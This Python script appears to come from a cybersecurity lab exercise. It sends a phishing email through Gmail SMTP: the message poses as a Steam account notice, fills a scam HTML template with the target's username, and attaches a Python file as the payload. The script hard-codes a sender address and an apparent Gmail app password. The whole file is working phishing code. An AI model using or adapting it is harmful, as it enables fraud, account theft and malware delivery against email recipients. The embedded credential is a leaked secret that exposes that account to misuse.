import sys
import create_attachment
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

# The mail we send the phishing mail from.
mail_sender_address = "labcyber523@gmail.com"

# The application key for the mail we send the phishing mail from.
application_key = "avowmnjsepifvwhi"

# The smtp server and port of the mail we send the phishing mail from.
smtp_server = "smtp.gmail.com"
smtp_port = 465

# The html file we send in the phishing mail, this will be the scam mail itself.
scam_html_file = "scam.html"

# The attachment file we send in the phishing mail.
attachment_file = "attachment.py"

"""
creates the mail and sends the mail.
"""


def function(array):
    username = sys.argv[1]
    mail_service_name = sys.argv[2]
    title = sys.argv[3]
    job_title = sys.argv[4]
    personal_status = sys.argv[5]
    kids = sys.argv[6]
    mail_receiver_address = username + "@" + mail_service_name

    print("username: ", username)
    print("mail service name: ", mail_service_name)
    print("title: ", title)
    print("job title: ", job_title)
    print("personal status: ", personal_status)
    print("kids: ", kids)

    fp = open(scam_html_file, "r")
    html = fp.read()
    html = html.replace("{{user}}", username)
    fp.close()

    message = MIMEMultipart("alternative")

    message["Subject"] = "Important Information about your steam account"
    message["From"] = mail_sender_address
    message["To"] = mail_receiver_address

    html_message = MIMEText(html, "html")

    with open(attachment_file, "rb") as file:
        attachment = MIMEBase("text", "x-python")  # Set content type to "text/x-python"
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", f"attachment; filename={attachment_file}")
        message.attach(attachment)

    message.attach(html_message)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", smtp_port, context=context) as server:
        server.login(mail_sender_address, application_key)
        server.sendmail(mail_sender_address, mail_receiver_address, message.as_string())

    print("Mail sent to: " + mail_receiver_address)


if __name__ == "__main__":
    function(sys.argv)
